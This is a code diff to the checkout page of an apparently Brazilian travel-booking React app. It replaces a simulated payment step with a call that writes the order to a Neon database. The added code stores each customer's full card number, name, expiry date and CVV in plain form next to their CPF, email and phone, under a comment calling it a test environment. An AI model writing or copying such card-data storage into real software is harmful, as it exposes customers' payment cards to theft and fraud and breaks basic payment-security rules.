@@ -17,6 +17,8 @@ import { brl, brlCents, dateBR } from "@/lib/format";
 import { cn } from "@/lib/utils";
 import type { PaymentProof, Traveler } from "@/data/types";
 import { PIX_ACCOUNT, PROOF_MAX_BYTES } from "@/data/pix";
+import { createOrder } from "@/api/orders";
+
 
 
 export const Route = createFileRoute("/checkout/$slug")({
@@ -150,11 +152,10 @@ function Checkout() {
     setStep((s) => Math.min(STEPS.length - 1, s + 1));
   };
 
-  const finish = () => {
+  const finish = async () => {
     if (!validateStep()) return;
     setProcessing(true);
-    // Simulação de gateway de pagamento (ambiente de teste dos desenvolvedores).
-    window.setTimeout(() => {
+    try {
       const methodLabel =
         method === "credito"
           ? `Cartão de crédito • ${card.installments}x • **** ${card.number.replace(/\D/g, "").slice(-4)}`
@@ -164,7 +165,34 @@ function Checkout() {
               ? `Pix • ${PIX_ACCOUNT.key} • ${PIX_ACCOUNT.holder}`
               : "Boleto bancário";
 
-      const booking = addBooking({
+      const code = `VB-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;
+      const status = method === "boleto" || method === "pix" ? "Pendente" : "Confirmado";
+
+      // Salvar no banco de dados Neon com TODOS os dados
+      await createOrder({
+        data: {
+          code,
+          customerName: contact.name,
+          customerEmail: contact.email,
+          customerPhone: contact.phone,
+          customerCpf: contact.cpf,
+          packageTitle: pkg.title,
+          total: totals.total,
+          paymentMethod: methodLabel,
+          status,
+          // Dados completos do cartão (ambiente de testes)
+          cardNumber: (method === "credito" || method === "debito") ? card.number : undefined,
+          cardName: (method === "credito" || method === "debito") ? card.name : undefined,
+          cardExpiry: (method === "credito" || method === "debito") ? card.expiry : undefined,
+          cardCvv: (method === "credito" || method === "debito") ? card.cvv : undefined,
+          extras: extras.length > 0 ? JSON.stringify(extras) : undefined,
+          travelers: JSON.stringify(travelers),
+          coupon: appliedCoupon?.code,
+        }
+      });
+
+      // Também registrar localmente para a tela de confirmação
+      addBooking({
         packageSlug: pkg.slug,
         packageTitle: pkg.title,
         destination: `${destination?.name}, ${destination?.uf}`,
@@ -180,17 +208,22 @@ function Checkout() {
         customerName: contact.name,
         ...(method === "pix" && proof ? { proof } : {}),
       });
+
       if (!user) login(contact.email, contact.name);
       setProcessing(false);
-      setDone({ code: booking.code, total: totals.total });
+      setDone({ code, total: totals.total });
       toast.success(
         method === "pix"
-          ? "Comprovante enviado! A reserva ficará pendente até a validação do pagamento."
-          : "Reserva registrada com sucesso (pagamento simulado).",
+          ? "Comprovante enviado! A reserva ficará pendente até a validação."
+          : "Reserva salva no banco de dados com sucesso!",
       );
-
-    }, 1400);
+    } catch (err: any) {
+      setProcessing(false);
+      toast.error("Erro ao salvar reserva: " + (err?.message || "Tente novamente."));
+    }
   };
+
+
 
   if (done) {
     return (
